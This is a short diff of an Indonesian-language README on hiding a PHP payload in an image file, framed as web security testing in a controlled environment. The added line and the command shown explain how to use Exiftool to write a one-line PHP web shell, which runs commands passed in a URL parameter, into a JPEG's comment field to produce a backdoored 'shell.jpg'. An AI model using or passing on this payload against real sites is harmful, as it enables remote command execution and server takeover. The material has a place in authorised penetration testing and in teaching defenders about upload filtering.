@@ -2,6 +2,7 @@
 Steganografi untuk menyisipkan payload PHP dalam file gambar, digunakan untuk pengujian keamanan web di lingkungan terkontrol. 
 
 # Payload
+Sisipkan backdoor kedalam sebuah file gambar dengan <a href="https://exiftool.org/" target="_blank">Exiftool</a> :
 
 ```
 exiftool -Comment='<?php system($_GET["cmd"]); ?>' kucing.jpg -o shell.jpg
